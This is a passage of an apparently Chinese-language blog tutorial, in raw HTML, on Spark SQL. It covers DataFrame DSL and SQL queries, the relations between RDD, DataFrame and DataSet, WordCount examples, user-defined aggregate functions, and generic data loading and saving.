class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// 查看 name 字段的数据</span><br><span class="line">personDF.select(personDF.col(<span class="string">"name"</span>)).show</span><br><span class="line">personDF.select(personDF(<span class="string">"name"</span>)).show</span><br><span class="line">personDF.select(<span class="keyword">col</span>(<span class="string">"name"</span>)).show</span><br><span class="line">personDF.select(<span class="string">"name"</span>).show</span><br><span class="line"></span><br><span class="line">// 查看 <span class="keyword">name</span> 和 age 字段数据</span><br><span class="line">personDF.select(<span class="string">"name"</span>, <span class="string">"age"</span>).show</span><br><span class="line"></span><br><span class="line">// 查询所有的 <span class="keyword">name</span> 和 age，并将 age+<span class="number">1</span></span><br><span class="line">personDF.select(personDF.col(<span class="string">"name"</span>), personDF.col(<span class="string">"age"</span>) + <span class="number">1</span>).show</span><br><span class="line">personDF.select(personDF(<span class="string">"name"</span>), personDF(<span class="string">"age"</span>) + <span class="number">1</span>).show</span><br><span class="line">personDF.select(<span class="keyword">col</span>(<span class="string">"name"</span>), <span class="keyword">col</span>(<span class="string">"age"</span>) + <span class="number">1</span>).show</span><br><span class="line">personDF.select(<span class="string">"name"</span>,<span class="string">"age"</span>).show</span><br><span class="line">//personDF.select(<span class="string">"name"</span>, <span class="string">"age"</span>+<span class="number">1</span>).show</span><br><span class="line">personDF.select($<span class="string">"name"</span>,$<span class="string">"age"</span>,$<span class="string">"age"</span>+<span class="number">1</span>).show</span><br><span class="line"></span><br><span class="line">// 过滤 age 大于等于 <span class="number">25</span> 的，使用 filter 方法过滤</span><br><span class="line">personDF.filter(<span class="keyword">col</span>(<span class="string">"age"</span>) &gt;= <span class="number">25</span>).show</span><br><span class="line">personDF.filter($<span class="string">"age"</span> &gt;<span class="number">25</span>).show</span><br><span class="line"></span><br><span class="line">// 统计年龄大于 <span class="number">30</span> 的人数</span><br><span class="line">personDF.filter(<span class="keyword">col</span>(<span class="string">"age"</span>)&gt;<span class="number">30</span>).count()</span><br><span class="line">personDF.filter($<span class="string">"age"</span> &gt;<span class="number">30</span>).count()</span><br><span class="line"></span><br><span class="line">// 按年龄进行分组并统计相同年龄的人数</span><br><span class="line">personDF.groupBy(<span class="string">"age"</span>).count().show</span><br></pre></td></tr></table></figure><p><strong>SQL 风格</strong>：DataFrame 的一个强大之处就是我们可以将它看作是一个关系型数据表，然后可以通过在程序中使用 spark.sql() 来执行 SQL 查询，结果将作为一个 DataFrame 返回</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// 如果想使用 SQL 风格的语法，需要将 DataFrame 注册成表,采用如下的方式</span><br><span class="line">personDF.createOrReplaceTempView("t_person")</span><br><span class="line">spark.sql("<span class="keyword">select</span> * <span class="keyword">from</span> t_person<span class="string">").show</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 显示表的描述信息</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">desc</span> t_person<span class="string">").show</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 查询年龄最大的前两名</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> * <span class="keyword">from</span> t_person <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">2</span><span class="string">").show</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 查询年龄大于 30 的人的信息</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> * <span class="keyword">from</span> t_person <span class="keyword">where</span> age &gt; <span class="number">30</span> <span class="string">").show</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 使用 SQL 风格完成 DSL 中的需求</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> <span class="keyword">name</span>, age + <span class="number">1</span> <span class="keyword">from</span> t_person<span class="string">").show</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> <span class="keyword">name</span>, age <span class="keyword">from</span> t_person <span class="keyword">where</span> age &gt; <span class="number">25</span><span class="string">").show</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> <span class="keyword">count</span>(age) <span class="keyword">from</span> t_person <span class="keyword">where</span> age &gt; <span class="number">30</span><span class="string">").show</span></span><br><span class="line"><span class="string">spark.sql("</span><span class="keyword">select</span> age, <span class="keyword">count</span>(age) <span class="keyword">from</span> t_person <span class="keyword">group</span> <span class="keyword">by</span> age<span class="string">").show</span></span><br></pre></td></tr></table></figure><p><strong>总结</strong>：</p><ul><li><strong>DataFrame 和 DataSet 都可以通过 RDD 来进行创建</strong>；</li><li><strong>也可以通过读取普通文本创建–注意:直接读取没有完整的约束,需要通过 RDD+Schema</strong>；</li><li><strong>通过 josn/parquet 会有完整的约束</strong>；</li><li><strong>不管是 DataFrame 还是 DataSet 都可以注册成表，之后就可以使用 SQL 进行查询了! 也可以使用 DSL</strong>!</li></ul><h3 id="2-4-RDD、DataFrame、DataSet-三者的关系">2.4 RDD、DataFrame、DataSet 三者的关系</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291816207.png" alt></p><p><strong>共性：</strong></p><ul><li>RDD、DataFrame、DataSet 全都是 spark 平台下的分布式弹性数据集，为处理超大型数据提供便利;</li><li>三者都有惰性机制，在进行创建、转换，如 map 方法时，不会立即执行，只有在遇到Action 如 foreach 时，三者才会开始遍历运算;</li><li>三者有许多共同的函数，如 filter，排序等;</li><li>在对DataFrame 和Dataset 进行操作许多操作都需要这个包:<code>import spark.implicits._</code>（在创建好 SparkSession 对象后尽量直接导入）</li><li>三者都会根据 Spark 的内存情况自动缓存运算，这样即使数据量很大，也不用担心会内存溢出</li><li>三者都有 partition 的概念</li><li>DataFrame 和DataSet 均可使用模式匹配获取各个字段的值和类型</li></ul><p><strong>不同：</strong></p><ul><li>RDD，RDD 一般和 spark mllib 同时使用；RDD 不支持 sparksql 操作</li><li>DataFrame，与 RDD 和 Dataset 不同，DataFrame 每一行的类型固定为Row，每一列的值没法直接访问，只有通过解析才能获取各个字段的值；DataFrame 与DataSet 一般不与 spark mllib 同时使用；DataFrame 与DataSet 均支持 SparkSQL 的操作，比如 select，groupby 之类，还能注册临时表/视窗，进行 sql 语句操作；DataFrame 与DataSet 支持一些特别方便的保存方式，比如保存成 csv，可以带上表头，这样每一列的字段名一目了然(后面专门讲解)</li><li>DataSet，Dataset 和DataFrame 拥有完全相同的成员函数，区别只是每一行的数据类型不同；DataFrame 其实就是DataSet 的一个特例 <code>type DataFrame = Dataset[Row]</code>；DataFrame 也可以叫Dataset[Row],每一行的类型是 Row，不解析，每一行究竟有哪些字段，各个字段又是什么类型都无从得知，只能用上面提到的 getAS 方法或者共性中的第七条提到的模式匹配拿出特定字段。而Dataset 中，每一行是什么类型是不一定的，在自定义了 case class 之后可以很自由的获得每一行的信息</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">object Spark01_SparkSQL_Basic &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">def <span class="title">main</span><span class="params">(args: Array[String])</span>: Unit </span>= &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 创建SparkSQL的运行环境</span></span><br><span class="line">        val sparkConf = <span class="keyword">new</span> SparkConf().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"sparkSQL"</span>)</span><br><span class="line">        val spark = SparkSession.builder().config(sparkConf).getOrCreate()</span><br><span class="line">        <span class="keyword">import</span> spark.implicits._</span><br><span class="line"></span><br><span class="line">        <span class="comment">// RDD &lt;=&gt; DataFrame</span></span><br><span class="line">        val rdd = spark.sparkContext.makeRDD(List((<span class="number">1</span>, <span class="string">"zhangsan"</span>, <span class="number">30</span>), (<span class="number">2</span>, <span class="string">"lisi"</span>, <span class="number">40</span>)))</span><br><span class="line">        val df: DataFrame = rdd.toDF(<span class="string">"id"</span>, <span class="string">"name"</span>, <span class="string">"age"</span>)</span><br><span class="line">        val rowRDD: RDD[Row] = df.rdd</span><br><span class="line"></span><br><span class="line">        <span class="comment">// DataFrame &lt;=&gt; DataSet</span></span><br><span class="line">        val ds: Dataset[User] = df.as[User]</span><br><span class="line">        val df1: DataFrame = ds.toDF()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// RDD &lt;=&gt; DataSet</span></span><br><span class="line">        val ds1: Dataset[User] = rdd.map &#123;</span><br><span class="line">            <span class="keyword">case</span> (id, name, age) =&gt; &#123;</span><br><span class="line">                User(id, name, age)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.toDS()</span><br><span class="line">        val userRDD: RDD[User] = ds1.rdd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 关闭环境</span></span><br><span class="line">        spark.close()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">case</span> class <span class="title">User</span><span class="params">( id:Int, name:String, age:Int )</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="3、Spark实战">3、Spark实战</h2><h3 id="3-1-Spark-SQL-完成-WordCount">3.1 Spark SQL 完成 WordCount</h3><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-sql_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>SQL风格</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="comment">//1.创建SparkSession</span></span><br><span class="line">    <span class="keyword">val</span> spark: <span class="type">SparkSession</span> = <span class="type">SparkSession</span>.builder().master(<span class="string">"local[*]"</span>).appName(<span class="string">"SparkSQL"</span>).getOrCreate()</span><br><span class="line">    <span class="keyword">val</span> sc: <span class="type">SparkContext</span> = spark.sparkContext</span><br><span class="line">    sc.setLogLevel(<span class="string">"WARN"</span>)</span><br><span class="line">    <span class="comment">//2.读取文件</span></span><br><span class="line">    <span class="keyword">val</span> fileDF: <span class="type">DataFrame</span> = spark.read.text(<span class="string">"D:\\data\\words.txt"</span>)</span><br><span class="line">    <span class="keyword">val</span> fileDS: <span class="type">Dataset</span>[<span class="type">String</span>] = spark.read.textFile(<span class="string">"D:\\data\\words.txt"</span>)</span><br><span class="line">    <span class="comment">//fileDF.show()</span></span><br><span class="line">    <span class="comment">//fileDS.show()</span></span><br><span class="line">    <span class="comment">//3.对每一行按照空格进行切分并压平</span></span><br><span class="line">    <span class="comment">//fileDF.flatMap(_.split(" ")) //注意:错误,因为DF没有泛型,不知道_是String</span></span><br><span class="line">    <span class="keyword">import</span> spark.implicits._</span><br><span class="line">    <span class="keyword">val</span> wordDS: <span class="type">Dataset</span>[<span class="type">String</span>] = fileDS.flatMap(_.split(<span class="string">" "</span>))<span class="comment">//注意:正确,因为DS有泛型,知道_是String</span></span><br><span class="line">    <span class="comment">//wordDS.show()</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    +-----+</span></span><br><span class="line"><span class="comment">    |value|</span></span><br><span class="line"><span class="comment">    +-----+</span></span><br><span class="line"><span class="comment">    |hello|</span></span><br><span class="line"><span class="comment">    |   me|</span></span><br><span class="line"><span class="comment">    |hello|</span></span><br><span class="line"><span class="comment">    |  you|</span></span><br><span class="line"><span class="comment">      ...</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//4.对上面的数据进行WordCount</span></span><br><span class="line">    wordDS.createOrReplaceTempView(<span class="string">"t_word"</span>)</span><br><span class="line">    <span class="keyword">val</span> sql =</span><br><span class="line">      <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">        |select value ,count(value) as count</span></span><br><span class="line"><span class="string">        |from t_word</span></span><br><span class="line"><span class="string">        |group by value</span></span><br><span class="line"><span class="string">        |order by count desc</span></span><br><span class="line"><span class="string">      "</span><span class="string">""</span>.stripMargin</span><br><span class="line">    spark.sql(sql).show()</span><br><span class="line"></span><br><span class="line">    sc.stop()</span><br><span class="line">    spark.stop()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>DSL 风格</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">WordCount2</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="comment">//1.创建SparkSession</span></span><br><span class="line">    <span class="keyword">val</span> spark: <span class="type">SparkSession</span> = <span class="type">SparkSession</span>.builder().master(<span class="string">"local[*]"</span>).appName(<span class="string">"SparkSQL"</span>).getOrCreate()</span><br><span class="line">    <span class="keyword">val</span> sc: <span class="type">SparkContext</span> = spark.sparkContext</span><br><span class="line">    sc.setLogLevel(<span class="string">"WARN"</span>)</span><br><span class="line">    <span class="comment">//2.读取文件</span></span><br><span class="line">    <span class="keyword">val</span> fileDF: <span class="type">DataFrame</span> = spark.read.text(<span class="string">"D:\\data\\words.txt"</span>)</span><br><span class="line">    <span class="keyword">val</span> fileDS: <span class="type">Dataset</span>[<span class="type">String</span>] = spark.read.textFile(<span class="string">"D:\\data\\words.txt"</span>)</span><br><span class="line">    <span class="comment">//fileDF.show()</span></span><br><span class="line">    <span class="comment">//fileDS.show()</span></span><br><span class="line">    <span class="comment">//3.对每一行按照空格进行切分并压平</span></span><br><span class="line">    <span class="comment">//fileDF.flatMap(_.split(" ")) //注意:错误,因为DF没有泛型,不知道_是String</span></span><br><span class="line">    <span class="keyword">import</span> spark.implicits._</span><br><span class="line">    <span class="keyword">val</span> wordDS: <span class="type">Dataset</span>[<span class="type">String</span>] = fileDS.flatMap(_.split(<span class="string">" "</span>))<span class="comment">//注意:正确,因为DS有泛型,知道_是String</span></span><br><span class="line">    <span class="comment">//wordDS.show()</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    +-----+</span></span><br><span class="line"><span class="comment">    |value|</span></span><br><span class="line"><span class="comment">    +-----+</span></span><br><span class="line"><span class="comment">    |hello|</span></span><br><span class="line"><span class="comment">    |   me|</span></span><br><span class="line"><span class="comment">    |hello|</span></span><br><span class="line"><span class="comment">    |  you|</span></span><br><span class="line"><span class="comment">      ...</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//4.对上面的数据进行WordCount</span></span><br><span class="line">    wordDS.groupBy(<span class="string">"value"</span>).count().orderBy($<span class="string">"count"</span>.desc).show()</span><br><span class="line"></span><br><span class="line">    sc.stop()</span><br><span class="line">    spark.stop()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-用户自定义函数">3.2 用户自定义函数</h3><p>用户可以通过 spark.udf 功能添加自定义函数，实现自定义功能</p><p>对于UDF，见如下基础功能</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 创建SparkSQL的运行环境</span></span><br><span class="line">    <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"sparkSQL"</span>)</span><br><span class="line">    <span class="keyword">val</span> spark = <span class="type">SparkSession</span>.builder().config(sparkConf).getOrCreate()</span><br><span class="line">    <span class="keyword">import</span> spark.implicits._</span><br><span class="line">    <span class="comment">// 1)创建DataFrame</span></span><br><span class="line">    <span class="keyword">val</span> df = spark.read.json(<span class="string">"datas/user.json"</span>)</span><br><span class="line">    df.createOrReplaceTempView(<span class="string">"user"</span>)</span><br><span class="line">    <span class="comment">//2)注册UDF</span></span><br><span class="line">    spark.udf.register(<span class="string">"prefixName"</span>, (name:<span class="type">String</span>) =&gt; &#123;</span><br><span class="line">        <span class="string">"Name: "</span> + name</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">//应用UDF</span></span><br><span class="line">    spark.sql(<span class="string">"select age, prefixName(username) from user"</span>).show</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 关闭环境</span></span><br><span class="line">    spark.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UDAF是User-Defined Aggregation Functions（用户自定义聚合函数），强类型的Dataset 和弱类型的 DataFrame 都提供了相关的聚合函数， 如 count()，countDistinct()，avg()，max()，min()。除此之外，用户可以设定自己的自定义聚合函数。通过继承 UserDefinedAggregateFunction 来实现用户自定义弱类型聚合函数。从Spark3.0 版本后，UserDefinedAggregateFunction 已经不推荐使用了。可以<strong>统一采用强类型聚合函数Aggregator</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark03_SparkSQL_UDAF1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO 创建SparkSQL的运行环境</span></span><br><span class="line">        <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"sparkSQL"</span>)</span><br><span class="line">        <span class="keyword">val</span> spark = <span class="type">SparkSession</span>.builder().config(sparkConf).getOrCreate()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> df = spark.read.json(<span class="string">"datas/user.json"</span>)</span><br><span class="line">        df.createOrReplaceTempView(<span class="string">"user"</span>)</span><br><span class="line">        spark.udf.register(<span class="string">"ageAvg"</span>, functions.udaf(<span class="keyword">new</span> <span class="type">MyAvgUDAF</span>()))</span><br><span class="line">        spark.sql(<span class="string">"select ageAvg(age) from user"</span>).show</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 早期版本中，spark不能在sql中使用强类型UDAF操作</span></span><br><span class="line">        <span class="comment">// SQL &amp; DSL</span></span><br><span class="line">        <span class="comment">// 早期的UDAF强类型聚合函数使用DSL语法操作</span></span><br><span class="line">        <span class="comment">// val ds: Dataset[User] = df.as[User]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将UDAF函数转换为查询的列对象，注意下面的in要修改成User</span></span><br><span class="line">        <span class="comment">// val udafCol: TypedColumn[User, Long] = new MyAvgUDAF().toColumn</span></span><br><span class="line">        <span class="comment">// ds.select(udafCol).show</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// TODO 关闭环境</span></span><br><span class="line">        spark.close()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     自定义聚合函数类：计算年龄的平均值</span></span><br><span class="line"><span class="comment">     1. 继承org.apache.spark.sql.expressions.Aggregator, 定义泛型</span></span><br><span class="line"><span class="comment">         IN : 输入的数据类型 Long</span></span><br><span class="line"><span class="comment">         BUF : 缓冲区的数据类型 Buff</span></span><br><span class="line"><span class="comment">         OUT : 输出的数据类型 Long</span></span><br><span class="line"><span class="comment">     2. 重写方法(6)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Buff</span>(<span class="params"> var total:<span class="type">Long</span>, var count:<span class="type">Long</span> </span>)</span></span><br><span class="line"><span class="class">    <span class="title">class</span> <span class="title">MyAvgUDAF</span> <span class="keyword">extends</span> <span class="title">Aggregator</span>[<span class="type">Long</span>, <span class="type">Buff</span>, <span class="type">Long</span>]</span>&#123;</span><br><span class="line">        <span class="comment">// z &amp; zero : 初始值或零值</span></span><br><span class="line">        <span class="comment">// 缓冲区的初始化</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">zero</span></span>: <span class="type">Buff</span> = &#123;</span><br><span class="line">            <span class="type">Buff</span>(<span class="number">0</span>L,<span class="number">0</span>L)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据输入的数据更新缓冲区的数据</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">reduce</span></span>(buff: <span class="type">Buff</span>, in: <span class="type">Long</span>): <span class="type">Buff</span> = &#123;</span><br><span class="line">            buff.total = buff.total + in</span><br><span class="line">            buff.count = buff.count + <span class="number">1</span></span><br><span class="line">            buff</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并缓冲区</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">merge</span></span>(buff1: <span class="type">Buff</span>, buff2: <span class="type">Buff</span>): <span class="type">Buff</span> = &#123;</span><br><span class="line">            buff1.total = buff1.total + buff2.total</span><br><span class="line">            buff1.count = buff1.count + buff2.count</span><br><span class="line">            buff1</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//计算结果</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">finish</span></span>(buff: <span class="type">Buff</span>): <span class="type">Long</span> = &#123;</span><br><span class="line">            buff.total / buff.count</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 缓冲区的编码操作</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">bufferEncoder</span></span>: <span class="type">Encoder</span>[<span class="type">Buff</span>] = <span class="type">Encoders</span>.product</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出的编码操作</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">outputEncoder</span></span>: <span class="type">Encoder</span>[<span class="type">Long</span>] = <span class="type">Encoders</span>.scalaLong</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、数据的加载和保存">4、数据的加载和保存</h2><h3 id="4-1-通用的加载和保存方式">4.1 通用的加载和保存方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===============加载数据============</span></span><br><span class="line"><span class="comment"># spark.read.load 是加载数据的通用方法</span></span><br><span class="line"><span class="comment"># 如果读取不同格式的数据，可以对不同的数据格式进行设定</span></span><br><span class="line">spark.read.format(<span class="string">"…"</span>)[.option(<span class="string">"…"</span>)].load(<span class="string">"…"</span>)</span><br><span class="line"><span class="comment"># format("…")：指定加载的数据类型，包括"csv"、"jdbc"、"json"、"orc"、"parquet"和"textFile"</span></span><br><span class="line"><span class="comment"># load("…")：在"csv"、"jdbc"、"json"、"orc"、"parquet"和"textFile"格式下需要传入加载数据的路径</span></span><br><span class="line"><span class="comment"># option("…")：在"jdbc"格式下需要传入 JDBC 相应参数，url、user、password 和 dbtable</span></span><br><span class="line"><span class="comment"># 接在文件上进行查询: 文件格式.`文件路径`</span></span><br><span class="line">spark.sql(<span class="string">"select * from json.`/opt/module/data/user.json`"</span>).show</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============保存数据==========</span></span><br><span class="line"><span class="comment"># df.write.save 是保存数据的通用方法</span></span><br><span class="line">df.write.format(<span class="string">"…"</span>)[.option(<span class="string">"…"</span>)].save(<span class="string">"…"</span>)</span><br><span class="line"><span class="comment"># format("…")：指定保存的数据类型，包括"csv"、"jdbc"、"json"、"orc"、"parquet"和"textFile"</span></span><br><span class="line"><span class="comment"># 